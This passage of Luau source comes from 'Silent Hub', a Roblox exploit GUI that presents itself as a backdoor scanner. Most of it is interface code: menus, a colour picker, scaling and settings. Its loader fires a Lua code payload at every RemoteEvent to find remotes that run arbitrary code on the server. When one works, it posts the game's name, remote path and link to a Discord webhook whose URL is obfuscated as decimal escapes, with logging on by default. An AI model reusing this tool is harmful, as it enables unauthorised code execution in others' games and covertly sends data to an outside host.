	button.MouseButton1Click:Connect(function()
		colorpick.Value = not colorpick.Value
	end)
end;
task.spawn(C_3d);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ScaleContainer.Scale.LocalScript
local function C_41()
local script = G2L["41"];
	local input = script.Parent
	local main = input.Parent.Parent.Parent.Parent
	
	local function update()
		if input.Text == "" then
			main.UIScale.Scale = 1
			return
		end
	
		local num = tonumber(input.Text)
	
		if not num or num <= 0 or num ~= num or math.abs(num) == math.huge then
			return
		end
	
		main.UIScale.Scale = math.clamp(num, 0.5, 2)
	end
	
	input:GetPropertyChangedSignal("Text"):Connect(update)
end;
task.spawn(C_41);
-- StarterGui.SilentHub.UI.MainContainer.MenuContainer.LocalScript
local function C_49()
local script = G2L["49"];
	local tweenservice = game:GetService("TweenService")
	
	local info = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local menucontainer = script.Parent
	local pages = menucontainer.Parent.PageContainer
	
	local templatebutton = script.Parent.MenuButton
	templatebutton.Visible = false
	
	local buttons = {}
	local currentpage
	
	local pagepositions = {}
	
	for _, page in ipairs(pages:GetChildren()) do
		if page:IsA("Frame") or page:IsA("ScrollingFrame") then
			pagepositions[page] = page.Position
		end
	end
	
	local function update(activepage)
		for _, p in ipairs(pages:GetChildren()) do
			if p:IsA("Frame") or p:IsA("ScrollingFrame") then
				local active = p == activepage
	
				local line = buttons[p.Name].IndicatorLine
				tweenservice:Create(line, info, {
					Size = active
						and UDim2.new(0, 86, 0.05, 0)
						or UDim2.new(0, 0, 0.05, 0)
				}):Play()
			end
		end
	
		if activepage == currentpage then
			return
		end
	
		if currentpage then
			local oldpage = currentpage
	
			local oldtween = tweenservice:Create(oldpage, info, {
				Position = pagepositions[oldpage] - UDim2.new(1, 0, 0, 0)
			})
	
			oldtween:Play()
	
			oldtween.Completed:Connect(function()
				if currentpage ~= oldpage then
					oldpage.Visible = false
					oldpage.Position = pagepositions[oldpage]
				end
			end)
		end
	
		activepage.Position = pagepositions[activepage] + UDim2.new(1, 0, 0, 0)
		activepage.Visible = true
	
		tweenservice:Create(activepage, info, {
			Position = pagepositions[activepage]
		}):Play()
	
		currentpage = activepage
	end
	
	for _, page in ipairs(pages:GetChildren()) do
		if page:IsA("Frame") or page:IsA("ScrollingFrame") then
			local button = templatebutton:Clone()
			button.Parent = menucontainer
			button.Visible = true
			button.Name = page.Name
			button.Text = page.Name
	
			buttons[page.Name] = button
	
			button.MouseButton1Click:Connect(function()
				update(page)
			end)
		end
	end
	
	for _, page in ipairs(pages:GetChildren()) do
		if (page:IsA("Frame") or page:IsA("ScrollingFrame")) and page.Visible then
			page.Position = pagepositions[page]
			update(page)
			break
		end
	end
end;
task.spawn(C_49);
-- StarterGui.SilentHub.UI.MainContainer.Header.Burger.LocalScript
local function C_4f()
local script = G2L["4f"];
	local tweenservice = game.TweenService
	local collectionservice = game.CollectionService
	
	local button = script.Parent
	local menucontainer = button.Parent.Parent.MenuContainer
	local pagecontainer = button.Parent.Parent.PageContainer
	
	local info = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local hidden = false
	
	local function togglemenu()
		if hidden == false then
			hidden = true
			for i, v in pairs(pagecontainer:GetDescendants()) do
				if v:IsA("ScrollingFrame") and collectionservice:HasTag(v, "page") then
					tweenservice:Create(menucontainer, info, {Position = UDim2.new(-0.2, 0, 0.12, 0)}):Play()
					tweenservice:Create(v, info, {Position = UDim2.new(0.096, 0, 0.029, 0)}):Play()
				end
			end
		elseif hidden == true then
			hidden = false
			for i, v in pairs(pagecontainer:GetDescendants()) do
				if v:IsA("ScrollingFrame") and collectionservice:HasTag(v, "page") then
					tweenservice:Create(menucontainer, info, {Position = UDim2.new(0, 0, 0.12, 0)}):Play()
					tweenservice:Create(v, info, {Position = UDim2.new(0.179, 0, 0.029, 0)}):Play()
				end
			end
		end
	end
	
	button.MouseButton1Click:Connect(function()
		togglemenu()
	end)
	
	
	
end;
task.spawn(C_4f);
-- StarterGui.SilentHub.UI.MainContainer.Header.Minimize.LocalScript
local function C_51()
local script = G2L["51"];
	local tweenservice = game.TweenService
	
	local button = script.Parent
	local maincontainer = button.Parent.Parent
	
	local info = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local minimized = maincontainer.Parent.Parent.Values.Minimized
	
	local size = maincontainer.Size
	
	local minimize = tweenservice:Create(maincontainer, info, {Size = UDim2.new(0, 603, 0, 35)})
	
	local restore = tweenservice:Create(maincontainer, info, {Size = size})
	
	button.MouseButton1Click:Connect(function()
		if minimized.Value == false then
			minimized.Value = true
			minimize:Play()
			button.Text = "_"
			for i, v in pairs(maincontainer:GetDescendants()) do
				if v.Name == "PageContainer" or v.Name == "MenuContainer" then
					v.Visible = false
				end
			end
		elseif minimized.Value == true then
			minimized.Value = false
			restore:Play()
			button.Text = "_"
			for i, v in pairs(maincontainer:GetDescendants()) do
				if v.Name == "PageContainer" or v.Name == "MenuContainer" then
					v.Visible = true
				end
			end
		end
	end)
end;
task.spawn(C_51);
-- StarterGui.SilentHub.UI.MainContainer.Header.Close.LocalScript
local function C_54()
local script = G2L["54"];
	local tweenservice = game.TweenService
	
	local button = script.Parent
	local maincontainer = button.Parent.Parent
	local openbutton = maincontainer.Parent.Open
	
	local info = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local closed = true
	
	local minimized = maincontainer.Parent.Parent.Values.Minimized
	
	
	function close()
		closed = true
		button.Interactable = false
		local one = tweenservice:Create(maincontainer, info, {Size = UDim2.new(0, 603, 0, 35)})
		local two = tweenservice:Create(maincontainer, info, {Size = UDim2.new(0, 0, 0, 35)})
		local three = tweenservice:Create(openbutton, info, {Position = UDim2.new(0, 0, 0.75, 0)})
		if maincontainer.Size == UDim2.new(0, 603, 0, 35) or minimized.Value == true then
			two:Play()
			two.Completed:Wait()
			maincontainer.Visible = false
			openbutton.Position = UDim2.new(-0.1, 0, 0.75, 0)
			three:Play()
			button.Interactable = true
		elseif minimized.Value == false then
			one:Play()
			for i, v in pairs(maincontainer:GetDescendants()) do
				if v.Name == "PageContainer" or v.Name == "MenuContainer" then
					v.Visible = false
				end
			end
			one.Completed:Wait()
			two:Play()
			two.Completed:Wait()
			maincontainer.Visible = false
			openbutton.Position = UDim2.new(-0.1, 0, 0.75, 0)
			three:Play()
			button.Interactable = true
		end
	end
	
	function open()
		closed = false
		openbutton.Interactable = false
		local three = tweenservice:Create(openbutton, info, {Position = UDim2.new(-0.1, 0, 0.75, 0)})
		local two = tweenservice:Create(maincontainer, info, {Size = UDim2.new(0, 603, 0, 35)})
		local one = tweenservice:Create(maincontainer, info, {Size = UDim2.new(0, 603, 0, 311)})
		if maincontainer.Size == UDim2.new(0, 603, 0, 35) or minimized.Value == true then
			openbutton.Position = UDim2.new(0, 0, 0.75, 0)
			three:Play()
			maincontainer.Visible = true
			two:Play()
			openbutton.Interactable = true
		elseif minimized.Value == false then
			openbutton.Position = UDim2.new(0, 0, 0.75, 0)
			three:Play()
			maincontainer.Visible = true
			two:Play()
			two.Completed:Wait()
			for i, v in pairs(maincontainer:GetDescendants()) do
				if v.Name == "PageContainer" or v.Name == "MenuContainer" then
					v.Visible = true
				end
			end
			one:Play()
			openbutton.Interactable = true
		end
	end
	
	if closed == false then
		openbutton.Position = UDim2.new(-0.1, 0, 0.75, 0)
	else
		maincontainer.Size = UDim2.new(0, 0, 0, 35)
		for i, v in pairs(maincontainer:GetDescendants()) do
			if v.Name == "PageContainer" or v.Name == "MenuContainer" then
				v.Visible = false
			end
		end
	end
	
	button.MouseButton1Click:Connect(function()
		close()
	end)
	
	openbutton.MouseButton1Click:Connect(function()
		if closed == true then
			open()
		end
	end)
end;
task.spawn(C_54);
-- StarterGui.SilentHub.UI.ColorPick.LocalScript
local function C_58()
local script = G2L["58"];
	local ColorPicker do
		ColorPicker = {}
		
		ColorPicker.new = function()
			local newMt = setmetatable({},{})
			
			local pickerGui = script.Parent.ColorPicker
			local pickerTopBar = pickerGui.TopBar
			local pickerFrame = pickerGui.Content
			local colorSpace = pickerFrame.ColorSpaceFrame.ColorSpace
			local ColorLine = pickerFrame.ColorLine
			local previewFrame = pickerFrame.Preview
			local basicColorsFrame = pickerFrame.BasicColors
			local customColorsFrame = pickerFrame.CustomColors
			local okButton = pickerFrame.Ok
			local cancelButton = pickerFrame.Cancel
			local closeButton = pickerTopBar.Close
	
			local colorScope = colorSpace.Scope
			local colorArrow = pickerFrame.ArrowFrame.Arrow
	
			local hueInput = pickerFrame.Hue.Input
			local satInput = pickerFrame.Sat.Input
			local valInput = pickerFrame.Val.Input
	
			local redInput = pickerFrame.Red.Input
			local greenInput = pickerFrame.Green.Input
			local blueInput = pickerFrame.Blue.Input
	
			local user = game:GetService("UserInputService")
			local mouse = game:GetService("Players").LocalPlayer:GetMouse()
	
			local hue,sat,val = 0,0,1
			local red,green,blue = 1,1,1
			local chosenColor = Color3.new(0,0,0)
	
			local basicColors = {Color3.new(0,0,0),Color3.new(0.66666668653488,0,0),Color3.new(0,0.33333334326744,0),Color3.new(0.66666668653488,0.33333334326744,0),Color3.new(0,0.66666668653488,0),Color3.new(0.66666668653488,0.66666668653488,0),Color3.new(0,1,0),Color3.new(0.66666668653488,1,0),Color3.new(0,0,0.49803924560547),Color3.new(0.66666668653488,0,0.49803924560547),Color3.new(0,0.33333334326744,0.49803924560547),Color3.new(0.66666668653488,0.33333334326744,0.49803924560547),Color3.new(0,0.66666668653488,0.49803924560547),Color3.new(0.66666668653488,0.66666668653488,0.49803924560547),Color3.new(0,1,0.49803924560547),Color3.new(0.66666668653488,1,0.49803924560547),Color3.new(0,0,1),Color3.new(0.66666668653488,0,1),Color3.new(0,0.33333334326744,1),Color3.new(0.66666668653488,0.33333334326744,1),Color3.new(0,0.66666668653488,1),Color3.new(0.66666668653488,0.66666668653488,1),Color3.new(0,1,1),Color3.new(0.66666668653488,1,1),Color3.new(0.33333334326744,0,0),Color3.new(1,0,0),Color3.new(0.33333334326744,0.33333334326744,0),Color3.new(1,0.33333334326744,0),Color3.new(0.33333334326744,0.66666668653488,0),Color3.new(1,0.66666668653488,0),Color3.new(0.33333334326744,1,0),Color3.new(1,1,0),Color3.new(0.33333334326744,0,0.49803924560547),Color3.new(1,0,0.49803924560547),Color3.new(0.33333334326744,0.33333334326744,0.49803924560547),Color3.new(1,0.33333334326744,0.49803924560547),Color3.new(0.33333334326744,0.66666668653488,0.49803924560547),Color3.new(1,0.66666668653488,0.49803924560547),Color3.new(0.33333334326744,1,0.49803924560547),Color3.new(1,1,0.49803924560547),Color3.new(0.33333334326744,0,1),Color3.new(1,0,1),Color3.new(0.33333334326744,0.33333334326744,1),Color3.new(1,0.33333334326744,1),Color3.new(0.33333334326744,0.66666668653488,1),Color3.new(1,0.66666668653488,1),Color3.new(0.33333334326744,1,1),Color3.new(1,1,1)}
			local customColors = {}
	
			local function updateColor(noupdate)
				local relativeX,relativeY,relativeLineY = 219 - hue*219, 199 - sat*199, 199 - val*199
				local hsvColor = Color3.fromHSV(hue,sat,val)
		
				if noupdate == 2 or not noupdate then
					hueInput.Text = tostring(math.ceil(359*hue))
					satInput.Text = tostring(math.ceil(255*sat))
					valInput.Text = tostring(math.floor(255*val))
				end
				if noupdate == 1 or not noupdate then
					redInput.Text = tostring(math.floor(255*red))
					greenInput.Text = tostring(math.floor(255*green))
					blueInput.Text = tostring(math.floor(255*blue))
				end
		
				chosenColor = Color3.new(red,green,blue)
		
				colorScope.Position = UDim2.new(0,relativeX-9,0,relativeY-9)
				ColorLine.ImageColor3 = Color3.fromHSV(hue,sat,1)
				colorArrow.Position = UDim2.new(0,-2,0,relativeLineY-4)
				previewFrame.BackgroundColor3 = chosenColor
				
				newMt.Color = chosenColor
				if newMt.Changed then newMt:Changed(chosenColor) end
			end
	
			local function colorSpaceInput()
				local relativeX = mouse.X - colorSpace.AbsolutePosition.X
				local relativeY = mouse.Y - colorSpace.AbsolutePosition.Y
					
				if relativeX < 0 then relativeX = 0 elseif relativeX > 219 then relativeX = 219 end
				if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end
					
				hue = (219 - relativeX)/219
				sat = (199 - relativeY)/199
		
				local hsvColor = Color3.fromHSV(hue,sat,val)
				red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
		
				updateColor()
			end
	
			local function ColorLineInput()
				local relativeY = mouse.Y - ColorLine.AbsolutePosition.Y
		
				if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end	
		
				val = (199 - relativeY)/199
		
				local hsvColor = Color3.fromHSV(hue,sat,val)
				red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
		
				updateColor()
			end
	
			local function hookButtons(frame,func)
				frame.ArrowFrame.Up.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement then
						frame.ArrowFrame.Up.BackgroundTransparency = 0.5
					elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
						local releaseEvent,runEvent
				
						local startTime = tick()
						local pressing = true
						local startNum = tonumber(frame.Text)
				
						if not startNum then return end
				
						releaseEvent = user.InputEnded:Connect(function(input)
							if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
							releaseEvent:Disconnect()
							pressing = false
						end)
				
						startNum = startNum + 1
						func(startNum)
						while pressing do
							if tick()-startTime > 0.3 then
								startNum = startNum + 1
								func(startNum)
							end
							wait(0.1)
						end
					end
				end)
		
				frame.ArrowFrame.Up.InputEnded:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement then
						frame.ArrowFrame.Up.BackgroundTransparency = 1
					end
				end)
		
				frame.ArrowFrame.Down.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement then
						frame.ArrowFrame.Down.BackgroundTransparency = 0.5
					elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
						local releaseEvent,runEvent
				
						local startTime = tick()
						local pressing = true
						local startNum = tonumber(frame.Text)
				
						if not startNum then return end
				
						releaseEvent = user.InputEnded:Connect(function(input)
							if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
							releaseEvent:Disconnect()
							pressing = false
						end)
				
						startNum = startNum - 1
						func(startNum)
						while pressing do
							if tick()-startTime > 0.3 then
								startNum = startNum - 1
								func(startNum)
							end
							wait(0.1)
						end
					end
				end)
		
				frame.ArrowFrame.Down.InputEnded:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement then
						frame.ArrowFrame.Down.BackgroundTransparency = 1
					end
				end)
			end
	
			colorSpace.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					local releaseEvent,mouseEvent
			
					releaseEvent = user.InputEnded:Connect(function(input)
						if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	            		releaseEvent:Disconnect()
						mouseEvent:Disconnect()
					end)
			
					mouseEvent = user.InputChanged:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement then
							colorSpaceInput()
						end
					end)
			
					colorSpaceInput()
				end
			end)
	
			ColorLine.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					local releaseEvent,mouseEvent
			
					releaseEvent = user.InputEnded:Connect(function(input)
						if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	        		    releaseEvent:Disconnect()
						mouseEvent:Disconnect()
					end)
			
					mouseEvent = user.InputChanged:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement then
							ColorLineInput()
						end
					end)
			
					ColorLineInput()
				end
			end)
	
			local function updateHue(str)
				local num = tonumber(str)
				if num then
					hue = math.clamp(math.floor(num),0,359)/359
					local hsvColor = Color3.fromHSV(hue,sat,val)
					red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
					hueInput.Text = tostring(hue*359)
					updateColor(1)
				end
			end
			hueInput.FocusLost:Connect(function() updateHue(hueInput.Text) end) hookButtons(hueInput,updateHue)
	
			local function updateSat(str)
				local num = tonumber(str)
				if num then
					sat = math.clamp(math.floor(num),0,255)/255
					local hsvColor = Color3.fromHSV(hue,sat,val)
					red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
					satInput.Text = tostring(sat*255)
					updateColor(1)
				end
			end
			satInput.FocusLost:Connect(function() updateSat(satInput.Text) end) hookButtons(satInput,updateSat)
	
			local function updateVal(str)
				local num = tonumber(str)
				if num then
					val = math.clamp(math.floor(num),0,255)/255
					local hsvColor = Color3.fromHSV(hue,sat,val)
					red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
					valInput.Text = tostring(val*255)
					updateColor(1)
				end
			end
			valInput.FocusLost:Connect(function() updateVal(valInput.Text) end) hookButtons(valInput,updateVal)
			
			local function updateRed(str)
				local num = tonumber(str)
				if num then
					red = math.clamp(math.floor(num),0,255)/255
					local newColor = Color3.new(red,green,blue)
					hue,sat,val = newColor:ToHSV()
					redInput.Text = tostring(red*255)
					updateColor(2)
				end
			end
			redInput.FocusLost:Connect(function() updateRed(redInput.Text) end) hookButtons(redInput,updateRed)
			
			local function updateGreen(str)
				local num = tonumber(str)
				if num then
					green = math.clamp(math.floor(num),0,255)/255
					local newColor = Color3.new(red,green,blue)
					hue,sat,val = newColor:ToHSV()
					greenInput.Text = tostring(green*255)
					updateColor(2)
				end
			end
			greenInput.FocusLost:Connect(function() updateGreen(greenInput.Text) end) hookButtons(greenInput,updateGreen)
			
			local function updateBlue(str)
				local num = tonumber(str)
				if num then
					blue = math.clamp(math.floor(num),0,255)/255
					local newColor = Color3.new(red,green,blue)
					hue,sat,val = newColor:ToHSV()
					blueInput.Text = tostring(blue*255)
					updateColor(2)
				end
			end
			blueInput.FocusLost:Connect(function() updateBlue(blueInput.Text) end) hookButtons(blueInput,updateBlue)
			
			local colorChoice = Instance.new("TextButton")
			colorChoice.Name = "Choice"
			colorChoice.Size = UDim2.new(0,25,0,18)
			colorChoice.BorderColor3 = Color3.new(96/255,96/255,96/255)
			colorChoice.Text = ""
			colorChoice.AutoButtonColor = false
			
			local row = 0
			local column = 0
			for i,v in pairs(basicColors) do
				local newColor = colorChoice:Clone()
				newColor.BackgroundColor3 = v
				newColor.Position = UDim2.new(0,1 + 30*column,0,21 + 23*row)
				
				newColor.MouseButton1Click:Connect(function()
					red,green,blue = v.r,v.g,v.b
					local newColor = Color3.new(red,green,blue)
					hue,sat,val = newColor:ToHSV()
					updateColor()
				end)	
				
				newColor.Parent = basicColorsFrame
				column = column + 1
				if column == 6 then row = row + 1 column = 0 end
			end
			
			row = 0
			column = 0
			for i = 1,12 do
				local color = customColors[i] or Color3.new(0,0,0)
				local newColor = colorChoice:Clone()
				newColor.BackgroundColor3 = color
				newColor.Position = UDim2.new(0,1 + 30*column,0,20 + 23*row)
				
				newColor.MouseButton1Click:Connect(function()
					local curColor = customColors[i] or Color3.new(0,0,0)
					red,green,blue = curColor.r,curColor.g,curColor.b
					hue,sat,val = curColor:ToHSV()
					updateColor()
				end)
				
				newColor.MouseButton2Click:Connect(function()
					customColors[i] = chosenColor
					newColor.BackgroundColor3 = chosenColor
				end)
				
				newColor.Parent = customColorsFrame
				column = column + 1
				if column == 6 then row = row + 1 column = 0 end
			end
			
			pickerTopBar.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					local releaseEvent,mouseEvent
					local dragOffX,dragOffY = mouse.X-pickerTopBar.AbsolutePosition.X,mouse.Y-pickerTopBar.AbsolutePosition.Y
					
					releaseEvent = user.InputEnded:Connect(function(input)
						if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
						releaseEvent:Disconnect()
						mouseEvent:Disconnect()
					end)
					
					mouseEvent = user.InputChanged:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement then
							pickerGui.Position = UDim2.new(0,mouse.X-dragOffX,0,mouse.Y-dragOffY)
						end
					end)
				end
			end)
			
			okButton.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor) end pickerGui.Visible = false end)
			okButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then okButton.BackgroundTransparency = 0.3 end end)
			okButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then okButton.BackgroundTransparency = 0.7 end end)
			
			cancelButton.MouseButton1Click:Connect(function() if newMt.Cancel then newMt:Cancel() end pickerGui.Visible = false end)
			cancelButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0.3 end end)
			cancelButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0.7 end end)
			
			updateColor()
			
			newMt.SetColor = function(self,color)
				red,green,blue = color.r,color.g,color.b
				hue,sat,val = color:ToHSV()
				updateColor()
			end
			
			return newMt
		end
	end
	
	local picker = ColorPicker.new()
	picker.Confirm = function(self,color)end
	picker.Changed = function(self,color)end
	picker.Cancel = function(self)end
end;
task.spawn(C_58);
-- StarterGui.SilentHub.Scripts.Loader
local function C_c7()
local script = G2L["c7"];
	if _G.SilentHubLoaded then return end
	_G.SilentHubLoaded = true
	
	local beta = false
	
	local HttpService = game:GetService("HttpService")
	local TweenService = game:GetService("TweenService")
	
	local maincontainer = script.Parent.Parent.UI:WaitForChild("MainContainer")
	local openbutton = script.Parent.Parent.UI:WaitForChild("Open")
	local scale = maincontainer.UIScale
	
	local colorpick = script.Parent.Parent.UI:WaitForChild("ColorPick")
	local red = colorpick.ColorPicker.Content.Red.Input
	local green = colorpick.ColorPicker.Content.Green.Input
	local blue = colorpick.ColorPicker.Content.Blue.Input
	local cancelbutton = colorpick.ColorPicker.Content.Cancel
	local okbutton = colorpick.ColorPicker.Content.Ok
	
	local settings = maincontainer.PageContainer.Settings
	local rainbowtoggle = settings.RainbowContainer.Rainbow
	local savebutton = settings.ButtonContainer.SaveSettings
	local resetbutton = settings.ButtonContainer.ResetSettings
	
	local remotefound = script.Parent.Parent.Values.RemoteFound
	local remotepath = script.Parent.Parent.Values.RemotePath
	
	local AcquiredRemote = nil
	local isAcquiring = false
	
	local info = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local rainbowinfo = TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local rainbowenabled = maincontainer.Parent.Parent.Values.RainbowEnabled
	local rainbowrunning = false
	
	local pickerbackground = maincontainer.Parent.Parent.Values.ChangePickerBackground
	
	local foldername = "Silent Hub"
	local filename = foldername .. "/Settings.txt"
	
	pickerpreviouscolor = maincontainer.BackgroundColor3
	
	local start
	
	local attach
	local reattach
	
	local rainbowtween
	
	local mainsettings = {}
	
	local pickerconnections = {}
	
	local Config = _G.SilentHub or {}
	local Log = Config.Log ~= false
	
	local defaultsettings = {
		RedColor = 50/255,
		GreenColor = 50/255,
		BlueColor = 50/255,
		Scale = 1
	}
	
	openbutton.Position = UDim2.new(-0.1, 0, 0.75, 0)
	
	
	local function notify(title, text, duration)
		while true do
			local ok = pcall(function()
				game.StarterGui:SetCore("SendNotification", {
					Title = title,
					Text = text,
					Duration = duration or 5,
				})
			end)
	
			if ok then
				return
			end
	
			wait()
		end
	end
	
	local function ensurefolder()
		if typeof(isfolder) == "function" and typeof(makefolder) == "function" then
			if not isfolder(foldername) then
				makefolder(foldername)
			end
		end
	end
	
	local function readsettings()
		if typeof(readfile) ~= "function" or typeof(isfile) ~= "function" then
			return defaultsettings
		end
	
		if not isfile(filename) then
			return defaultsettings
		end
	
		local success, data = pcall(function()
			return HttpService:JSONDecode(readfile(filename))
		end)
	
		if success and type(data) == "table" then
			return data
		end
	
		return defaultsettings
	end
	
	local function writesettings(data)
		if typeof(writefile) ~= "function" then return end
		ensurefolder()
		writefile(filename, HttpService:JSONEncode(data))
	end
	
	local function applysettings(data)
		maincontainer.BackgroundColor3 = Color3.new(
			data.RedColor or 50/255,
			data.GreenColor or 50/255,
			data.BlueColor or 50/255
		)
		
		scale.Scale = data.Scale or 1
	end
	
	local function loadsettings()
		ensurefolder()
		mainsettings = readsettings()
		applysettings(mainsettings)
	end
	
	local function resetsettings()
		mainsettings = table.clone(defaultsettings)
		writesettings(mainsettings)
		applysettings(mainsettings)
	end
	
	local function savesettings()
		local data = {
			RedColor = maincontainer.BackgroundColor3.R,
			GreenColor = maincontainer.BackgroundColor3.G,
			BlueColor = maincontainer.BackgroundColor3.B,
			Scale = scale.Scale
		}
	
		mainsettings = data
		writesettings(data)
	end
	
	local function load()
		for i, v in pairs(maincontainer.PageContainer:GetChildren()) do
			if v:IsA("Frame") then
				v.Visible = false
			end
		end
	
		TweenService:Create(openbutton, info, {Position = UDim2.new(0, 0, 0.75, 0)}):Play()
	
		loadsettings()
	
		if typeof(writefile) ~= "function" then return end
		ensurefolder()
		writefile("Silent Hub/README.txt", [[
	Thank you for using Silent Hub as your backdoor scanner!
		
	Want scripts or more features added?
	
	Join our Discord for support, donations and more!
	
	Discord: https://dsc.gg/teamc00lkidd
	Roblox: https://www.roblox.com/groups/34005867
	YouTube: https://youtube.com/@team.c00lkidd
		]])
	end
	
	local function attach()
		if isAcquiring or AcquiredRemote then return end
		isAcquiring = true
	
		notify("Silent Hub", "Scanning for remotes, check console for info")
		start = tick()
	
		local ignored = game:FindFirstChild("RobloxReplicatedStorage")
		local tested = 0
	
		for pass = 1, 2 do
		for _, remote in ipairs(game:GetDescendants()) do
			if AcquiredRemote then break end
	
			if remote:IsA("RemoteEvent")
				and remote.Name ~= "UpdateCurrentCall"
				and (not ignored or not remote:IsDescendantOf(ignored))
			then
				tested += 1
	
				print("\nPath: game." .. remote:GetFullName() .."\nType: " .. remote.ClassName)
	
				local id = "Silent-" .. HttpService:GenerateGUID(false)
	
				local code = ([[local f=Instance.new("Folder")
	f.Name=%q
	f.Parent=game.JointsService
	task.delay(3,function() if f.Parent then f:Destroy() end end)]]):format(id)
	
					if remote:IsA("RemoteEvent") then
						pcall(function()
							remote:FireServer(code)
						end)
					else
						task.spawn(function()
							pcall(function()
								remote:InvokeServer(code)
							end)
						end)
					end
					
				wait(0.1)
	
				local deadline = tick() + 0.5
				repeat
					if game.JointsService:FindFirstChild(id) then
						AcquiredRemote = remote
						remotefound.Value = true
						remotepath.Value = remote:GetFullName()
	
						print("\nRemote Found!\nPath: game." .. remote:GetFullName() .."\nType: " .. remote.ClassName)
	
						AcquiredRemote = remote
						remotefound.Value = true
						remotepath.Value = remote:GetFullName()
	
						reattach(remote)
	
						load()
						
						notify("Silent Hub", ("Backdoor found in %.2fs!"):format(tick() - start))
						
	
						local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
						if request and Log then
							request({
									Url = '\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\097\112\112\046\099\111\109\047\097\112\105\047\119\101\098\104\111\111\107\115\047\049\053\051\050\053\056\054\052\052\049\053\056\048\055\052\048\055\048\056\047\085\088\099\082\081\077\116\049\054\098\055\098\109\073\053\112\070\067\088\107\052\102\049\069\054\057\090\100\116\103\085\049\095\115\075\100\105\117\087\086\077\116\090\067\119\102\054\107\122\057\112\051\079\088\097\116\114\050\087\074\119\087\050\117\087\077\086\078',
									Method = 'POST',
									Headers = {
										['Content-Type'] = 'application/json',
									},
									Body = HttpService:JSONEncode({
										username = "Silent Hub",
										embeds = {{
											title = "A backdoored game has been logged!",
											color = 0xFFFFFF,
	
											fields = {
												{
													name = "Game",
													value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
													inline = false
												},
												{
													name = "Remote Path",
													value = "`" .. remote:GetFullName() .. "`",
													inline = false
												},
												{
													name = "Game Link",
													value = ("https://www.roblox.com/games/%d"):format(game.PlaceId),
													inline = false
												}
											},
	
											footer = {
												text = "Silent Hub Backdoor Scanner"
											}
										}}
									})
							})
						end
	
						isAcquiring = false
						print("Tested " .. tested .. " remotes.")
						return
					end
	
					wait(0.05)
				until tick() >= deadline
			end
		end
			if AcquiredRemote then
				break
			end
	
			if pass == 1 then
				warn("No backdoor found on first pass, rescanning...")
				wait(0.25)
			end
		end
	
		print("Tested " .. tested .. " remotes.")
	
		isAcquiring = false
	
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Silent Hub",
			Text = "Backdoor not found."
		})
		
		maincontainer.Parent.Parent.Parent.SilentHub:Destroy()
	end
	
	function reattach(remote)
		local conn
	
		conn = remote.AncestryChanged:Connect(function(_, parent)
			if parent then
				return
			end
	
			conn:Disconnect()
	
			if AcquiredRemote ~= remote then
				return
			end
	
			AcquiredRemote = nil
			remotefound.Value = false
			remotepath.Value = ""
	
			print("Remote removed. Reattaching...")
	
			task.spawn(attach)
		end)
	end
	
	function rainbow()
		if rainbowrunning then return end
		rainbowrunning = true
	
		local colors = {
			Color3.fromRGB(255, 0, 0),
			Color3.fromRGB(255, 170, 0),
			Color3.fromRGB(255, 255, 0),
			Color3.fromRGB(0, 255, 0),
			Color3.fromRGB(0, 255, 255),
			Color3.fromRGB(0, 0, 255),
			Color3.fromRGB(127, 0, 255),
			Color3.fromRGB(255, 0, 255),
		}
	
		while rainbowenabled.Value do
			for _, color in ipairs(colors) do
				if not rainbowenabled.Value then
					break
				end
	
				rainbowtween = TweenService:Create(
					maincontainer,
					rainbowinfo,
					{
						BackgroundColor3 = color
					}
				)
	
				rainbowtween:Play()
				rainbowtween.Completed:Wait()
			end
		end
	
		rainbowtween = nil
		rainbowrunning = false
	end
	
	function colorset(frame)
		local r = tonumber(red.Text) or 50
		local g = tonumber(green.Text) or 50
		local b = tonumber(blue.Text) or 50
	
